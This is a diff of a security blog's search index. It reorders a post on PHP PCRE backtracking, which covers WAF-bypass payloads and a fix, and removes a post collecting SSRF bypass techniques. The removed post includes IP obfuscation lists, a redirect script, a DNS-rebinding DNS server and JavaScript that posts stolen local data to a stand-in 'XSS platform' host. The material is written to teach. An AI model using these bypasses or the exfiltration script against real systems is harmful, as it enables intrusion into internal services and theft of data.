@@ -1,73 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>PHP的PCRE库回溯问题</title>
-    <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>最近发现对PCRE的回溯机制理解还是很模糊，决定再仔细复习记录下</p>
-<h2 id="DFA与NFA"><a href="#DFA与NFA" class="headerlink" title="DFA与NFA"></a>DFA与NFA</h2><p>先简单了解下DFA与NFA这两种正则引擎：DFA为确定性有穷自动机，是文本主导，NFA为非确定性有穷自动机，是表达式主导。</p>
-<p>DFA与NFA机制上的不同带来3种主要影响：</p>
-<ol>
-<li>DFA对于文本串里的每一个字符只需扫描一次，比较快，但特性较少；NFA要翻来覆去吃字符、吐字符，速度慢，但是特性丰富，所以反而应用广泛，当今主要的正则表达式引擎，如Perl、Ruby、Python的re模块、Java和.NET的regex库，都是NFA的。</li>
-<li>NFA急于邀功请赏，所以最左子正则式优先匹配成功，因此偶尔会错过最佳匹配结果；DFA则是“最长的左子正则式优先匹配成功”。</li>
-<li>NFA可能会陷入递归调用的陷阱而表现得性能极差。</li>
-</ol>
-<p><strong>针对第2点，这里举个例子来说明：</strong></p>
-<p>比如正则表达式<code>/aaa|aaabbb/</code>与字符串<code>aaabbbccc</code>匹配，在php和awk的匹配结果就不一样。</p>
-<p>php的pcre库是NFA引擎，<strong>匹配结果是aaa</strong>。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; preg_match(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; print_r(<span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>awk使用的是DFA引擎，这里通过awk的sub函数将正则匹配中的内容替换为<code>(replace)</code>，可以看到<strong>匹配中的是aaabbb</strong>。</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>所以说NFA是最左子式匹配，而DFA是最长左子式匹配。</p>
-<p>针对第1和第3点递归和性能的影响，就不得不提到NFA匹配的回溯机制。</p>
-<h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式具有下面量词就是贪婪模式，在量词后面直接加上一个问号？就是非贪婪模式。</p>
-<p>　　量词：{m,n}：m到n个</p>
-<p>　　　　　*：任意多个</p>
-<p>　　　　　+：一个到多个</p>
-<p>　　　　　？：0或一个</p>
-<p>这里我们举个贪婪模式的例子，表达式<code>/.*a/</code>与<code>aaabbb</code>匹配，由于是<strong>贪婪模式</strong>，<code>.*</code>会把aaabbb全部吃掉，然后再从最后一个b往回吐，一直吐到第3个a时匹配上了，所以返回aaa。我们可以通过<a class="link"   href="https://regex101.com/debugger" >在线工具<i class="fas fa-external-link-alt"></i></a>debug下匹配步骤，可以看到，第7步吐到了字符串第3个a的位置，第8步表达式最后一个a与字符串的第3个a匹配才配成功，表达式匹配完了也就停止了，所以匹配结果是aaa。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932">
-
-<p>并且会随着b的数量增多，吐（回溯）的次数也会增多。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139">
-
-<p>再来看看<strong>非贪婪模式</strong>，正则改用<code>/.*?a/</code>，可以看到总共只需要匹配3步，在第1步<code>.*?</code>与字符串匹配时，由于是非贪婪模式，这里会把<code>.*?</code>放一放，优先用后面的表达式匹配，所以第2步表达式最后一个a与字符串第一个a匹配，匹配成功，然后往下匹配。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050">
-
-<p>第3步表达式结束符与字符串第2个a匹配不上，匹配结束，所以匹配结果为a。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722">
-
-<p>当我们字符串改为<code>bbbbbbbbbbbbbbbbba</code>，可以看到匹配步数增加到了20次，这是因为<code>.*?</code>为非贪婪模式，所以优先由表达式中的a与字符串第一个字符b匹配，匹配不上，再由<code>.*?</code>匹配，由于非贪婪模式，又优先a与第二个b匹配，匹配失败……一直重复，直到表达式a与字符串最后一个a匹配上为止。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726">
-
-<p>所以通过这个例子可以看出来，贪婪模式和非贪婪模式都会有回溯机制。</p>
-<h2 id="回溯机制引发的问题"><a href="#回溯机制引发的问题" class="headerlink" title="回溯机制引发的问题"></a>回溯机制引发的问题</h2><p>上面例子的回溯次数会随着字符b的数量增加而增加，当回溯次数非常大时，就可能会导致拒绝服务攻击（redos），PHP给pcre设定了一个回溯次数上限pcre.backtrack_limit来防止redos问题。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>当回溯次数大于1000000会有什么问题呢？</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// 贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*?a/s&#x27;</span>,str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// 非贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这里返回了false，并非正常匹配上返回的1，不匹配返回的0，官方文档也对这现象做出了解释：</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170">
-
-<p>所以我们也可以通过该特性绕过一些限制，比如基于php的waf：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里可以输入类似<code>SELECT * FROM XXX /*aaaaaaa......</code>的payload使回溯次数超过限制，从而返回false绕过if判断，类似还有非贪婪模式的错误用法：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 可以使用<code>UNION/*aaaaa......*/SELECT</code>增加回溯次数来绕过限制。</p>
-<p><strong>修复方法</strong></p>
-<p>我们可以通过全等号来判断<code>preg_match</code>的返回值</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >正则引擎：DFA与NFA<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFA与NFA的比较<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHP利用PCRE回溯次数限制绕过某些安全限制<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>CSP策略及绕过方法</title>
     <url>/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
     <content><![CDATA[<p>XSS是最常见、危害最大的网页安全漏洞，想要抵御它们，要采取非常多编程措施，非常麻烦。那么，有没有可以从根本上解决问题，浏览器自动禁止外部注入恶意脚本的方法呢？CSP应运而生。</p>
@@ -245,72 +178,70 @@
 ]]></content>
   </entry>
   <entry>
-    <title>SSRF绕过姿势汇总</title>
-    <url>/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/</url>
-    <content><![CDATA[<h2 id="1-符号绕过"><a href="#1-符号绕过" class="headerlink" title="1. @符号绕过"></a>1. @符号绕过</h2><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的</p>
-<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
-<h2 id="2-点分隔符替换"><a href="#2-点分隔符替换" class="headerlink" title="2. 点分隔符替换"></a>2. 点分隔符替换</h2><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://www。qq。com</span><br><span class="line">http://www｡qq｡com</span><br><span class="line">http://www．qq．com</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-本地回环地址"><a href="#3-本地回环地址" class="headerlink" title="3. 本地回环地址"></a>3. 本地回环地址</h2><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>)：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1 </span><br><span class="line">http:&#x2F;&#x2F;localhost </span><br><span class="line">http:&#x2F;&#x2F;127.255.255.254 </span><br><span class="line">127.0.0.1 - 127.255.255.254 </span><br><span class="line">http:&#x2F;&#x2F;127.1 </span><br><span class="line">http:&#x2F;&#x2F;127.0.1 </span><br><span class="line">http:&#x2F;&#x2F;0:80</span><br></pre></td></tr></table></figure>
-
-<p>IPV6</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:7f00:1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:127.0.0.1] </span><br><span class="line">http:&#x2F;&#x2F;ip6-localhost</span><br><span class="line">http:&#x2F;&#x2F;0--1.ipv6-literal.net</span><br></pre></td></tr></table></figure>
-
-<h2 id="4-DNS解析"><a href="#4-DNS解析" class="headerlink" title="4. DNS解析"></a>4. DNS解析</h2><p>配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line"></span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure>
-
-<p>xip.io是一个开源泛域名服务。它会把如下的域名解析到特定的地址，其实和dns解析绕过一个道理。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-IP的进制转换"><a href="#5-IP的进制转换" class="headerlink" title="5. IP的进制转换"></a>5. IP的进制转换</h2><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 <a class="link"   href="https://github.com/vysecurity/IPFuscator" >IPFuscator<i class="fas fa-external-link-alt"></i></a> 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化。</p>
-<h2 id="6-封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#6-封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="6. 封闭式字母数字 (Enclosed Alphanumerics)字符"></a>6. 封闭式字母数字 (Enclosed Alphanumerics)字符</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
-<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
-
-<h2 id="7-利用网址缩短"><a href="#7-利用网址缩短" class="headerlink" title="7. 利用网址缩短"></a>7. 利用网址缩短</h2><p>网上有很多将网址转换未短网址的网站。</p>
-<ul>
-<li><p><a class="link"   href="https://www.985.so/" >https://www.985.so/<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-<li><p><a class="link"   href="https://www.urlc.cn/" >https://www.urlc.cn/<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-</ul>
-<h2 id="8-利用30X重定向"><a href="#8-利用30X重定向" class="headerlink" title="8. 利用30X重定向"></a>8. 利用30X重定向</h2><p>可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。</p>
-<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</p>
-<p>服务端代码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;Location: http://192.168.1.10&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="9-DNS重绑定-DNS-Rebinding"><a href="#9-DNS重绑定-DNS-Rebinding" class="headerlink" title="9. DNS重绑定(DNS Rebinding)"></a>9. DNS重绑定(DNS Rebinding)</h2><p>通常我们通过域名访问应用的流程是：浏览器向DNS服务器发送请求，DNS服务器将请求的域名转换为ip地址，然后向对应的IP地址请求资源，最后回显给用户。</p>
-<p>在访问DNS后请求方会缓存域名和IP的对应关系，而缓存时间就是由DNS服务器设置的TTL值决定。</p>
-<p>当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改通过某种方式对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址，对于浏览器来说前后2次访问是同一域名，所以认为是安全的，这就可导致绕过同源策略和SSRF限制。下面介绍3种常见的DNS从绑定方法。</p>
-<h3 id="9-1-TTL-0的A记录"><a href="#9-1-TTL-0的A记录" class="headerlink" title="9.1 TTL=0的A记录"></a>9.1 TTL=0的A记录</h3><p>国内的域名厂商基本都不可以设置TTL为0，某些国外的域名才可以设置TTL=0，这方法只适用于前后两次请求存在一定有时间间隔或时间可控的情况。</p>
-<p>举个CTF例子，你能向服务器提交一个URL,并且服务器会访问你提交的url。然后flag藏在服务器的本身的<code>http://127.0.0.1/secret</code>上。只能本地访问。</p>
-<p>但是这里你提交你能控制的页面<code>www.x.com/index.php</code>，但是由于同源策略的原因你没办法去获取服务器上的<code>http://127.0.0.1/secret</code>。 但是通过<code>dns rebinding</code>就可以了。 比如你的页面如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://*********/static/jquery.min.js</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;POST()&quot;</span>,<span class="number">90000</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">POST</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">    alert();</span><br><span class="line"><span class="javascript">    $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">    url:<span class="string">&quot;http://www.x.com/secret&quot;</span>,</span></span><br><span class="line"><span class="javascript">    type:<span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="javascript">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.post(<span class="string">&quot;http://xss平台&quot;</span>,&#123;<span class="string">&#x27;a&#x27;</span>:data&#125;)&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>整个过程如下：</p>
+    <title>PHP的PCRE库回溯问题</title>
+    <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>最近发现对PCRE的回溯机制理解还是很模糊，决定再仔细复习记录下</p>
+<h2 id="DFA与NFA"><a href="#DFA与NFA" class="headerlink" title="DFA与NFA"></a>DFA与NFA</h2><p>先简单了解下DFA与NFA这两种正则引擎：DFA为确定性有穷自动机，是文本主导，NFA为非确定性有穷自动机，是表达式主导。</p>
+<p>DFA与NFA机制上的不同带来3种主要影响：</p>
 <ol>
-<li>你提交的是<code>www.x.com/index.php</code>，内容如上述代码</li>
-<li>设置你的域名的TTL=0，提交之后服务器会请求dns的域名与ip的关系然后找到你的这个页面，然后开始执行js。</li>
-<li>执行的时候先延迟90s，利用这延迟的90s，去修改你域名的A记录绑定到127.0.0.1上</li>
-<li>然后js延迟结束之后之后又会请求<code>http://www.x.com/secret</code>，由于你之前设置的TTL=0，所以又会重新向dns服务器请求一次ip。得到ip=127.0.0.1，而整个过程访问的都是同一域名，所以浏览器认为是安全的。就会成功去访问<code>http://127.0.0.1/secret</code>，从而绕过同源策略</li>
+<li>DFA对于文本串里的每一个字符只需扫描一次，比较快，但特性较少；NFA要翻来覆去吃字符、吐字符，速度慢，但是特性丰富，所以反而应用广泛，当今主要的正则表达式引擎，如Perl、Ruby、Python的re模块、Java和.NET的regex库，都是NFA的。</li>
+<li>NFA急于邀功请赏，所以最左子正则式优先匹配成功，因此偶尔会错过最佳匹配结果；DFA则是“最长的左子正则式优先匹配成功”。</li>
+<li>NFA可能会陷入递归调用的陷阱而表现得性能极差。</li>
 </ol>
-<h3 id="9-2-两条A记录"><a href="#9-2-两条A记录" class="headerlink" title="9.2 两条A记录"></a>9.2 两条A记录</h3><p>域名解析配置2条A记录，一条为外网的VPS IP，一条为内网IP，就<a class="link"   href="http://www.bendawang.site/2017/01/05/33c3-CTF-web-WriteUp/" >33c3-CTF list0r<i class="fas fa-external-link-alt"></i></a>这题而言，服务器会向DNS服务器连续访问2次请求，第一次判断解析后的IP是否在黑名单IP(本地IP)中，第二次就直接访问域名，所以需要第一次解析为外网地址，第二次解析为127.0.0.1，这种情况就可以采用此方法。DNS服务器绑定2条记录的解析是随机的，所以成功率只有1/4。</p>
-<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/586e317cb6a56d3762000002.png" class="" title="img">
+<p><strong>针对第2点，这里举个例子来说明：</strong></p>
+<p>比如正则表达式<code>/aaa|aaabbb/</code>与字符串<code>aaabbbccc</code>匹配，在php和awk的匹配结果就不一样。</p>
+<p>php的pcre库是NFA引擎，<strong>匹配结果是aaa</strong>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; preg_match(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; print_r(<span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
 
-<h3 id="9-3-NS记录-自建DNS服务器"><a href="#9-3-NS记录-自建DNS服务器" class="headerlink" title="9.3 NS记录+自建DNS服务器"></a>9.3 NS记录+自建DNS服务器</h3><p>此方法需要再我们DNS解析配置一条NS记录和一条A记录</p>
-<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161403319.png" class="" title="image-20220112161403319">
+<p>awk使用的是DFA引擎，这里通过awk的sub函数将正则匹配中的内容替换为<code>(replace)</code>，可以看到<strong>匹配中的是aaabbb</strong>。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>ns记录表示域名<code>test.p0melo.top</code>这个子域名指定由<code>ns.p0melo.top</code>这个域名服务器来解析，然后a记录表示我的这个<code>ns.p0melo.top</code>的位置在ip地址<code>149.248.18.38</code>上。然后我们用python的twisted库搭建一个DNS服务器就可以了。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord&#x3D;&#123;&#125;class DynamicResolver(object):    def _doDynamicResponse(self, query):        name &#x3D; query.name.name        if name not in record or record[name]&lt;1:            ip&#x3D;&quot;149.248.18.38&quot;        else:            ip&#x3D;&quot;127.0.0.1&quot;        if name not in record:            record[name]&#x3D;0        record[name]+&#x3D;1        print name+&quot; &#x3D;&#x3D;&#x3D;&gt; &quot;+ip        answer &#x3D; dns.RRHeader(            name&#x3D;name,            type&#x3D;dns.A,            cls&#x3D;dns.IN,            ttl&#x3D;0,            payload&#x3D;dns.Record_A(address&#x3D;b&#39;%s&#39;%ip,ttl&#x3D;0)        )        answers &#x3D; [answer]        authority &#x3D; []        additional &#x3D; []        return answers, authority, additional    def query(self, query, timeout&#x3D;None):        return defer.succeed(self._doDynamicResponse(query))def main():    factory &#x3D; server.DNSServerFactory(        clients&#x3D;[DynamicResolver(), client.Resolver(resolv&#x3D;&#39;&#x2F;etc&#x2F;resolv.conf&#39;)]    )    protocol &#x3D; dns.DNSDatagramProtocol(controller&#x3D;factory)    reactor.listenUDP(53, protocol)    reactor.run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    raise SystemExit(main())</span><br></pre></td></tr></table></figure>
+<p>所以说NFA是最左子式匹配，而DFA是最长左子式匹配。</p>
+<p>针对第1和第3点递归和性能的影响，就不得不提到NFA匹配的回溯机制。</p>
+<h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式具有下面量词就是贪婪模式，在量词后面直接加上一个问号？就是非贪婪模式。</p>
+<p>　　量词：{m,n}：m到n个</p>
+<p>　　　　　*：任意多个</p>
+<p>　　　　　+：一个到多个</p>
+<p>　　　　　？：0或一个</p>
+<p>这里我们举个贪婪模式的例子，表达式<code>/.*a/</code>与<code>aaabbb</code>匹配，由于是<strong>贪婪模式</strong>，<code>.*</code>会把aaabbb全部吃掉，然后再从最后一个b往回吐，一直吐到第3个a时匹配上了，所以返回aaa。我们可以通过<a class="link"   href="https://regex101.com/debugger" >在线工具<i class="fas fa-external-link-alt"></i></a>debug下匹配步骤，可以看到，第7步吐到了字符串第3个a的位置，第8步表达式最后一个a与字符串的第3个a匹配才配成功，表达式匹配完了也就停止了，所以匹配结果是aaa。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932">
 
-<p>我们使用<code>nslookup test.p0melo.top</code>查看解析结果，可以看到前后两次DNS解析不同</p>
-<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161740821.png" class="" title="image-20220112161740821">
+<p>并且会随着b的数量增多，吐（回溯）的次数也会增多。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139">
 
-<p><strong>参考链接</strong></p>
-<p><a class="link"   href="https://mp.weixin.qq.com/s/VvXCTNZhfknKNlcUdMzGBA" >SSRF防御与绕过<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" >关于DNS重绑定总结<i class="fas fa-external-link-alt"></i></a></p>
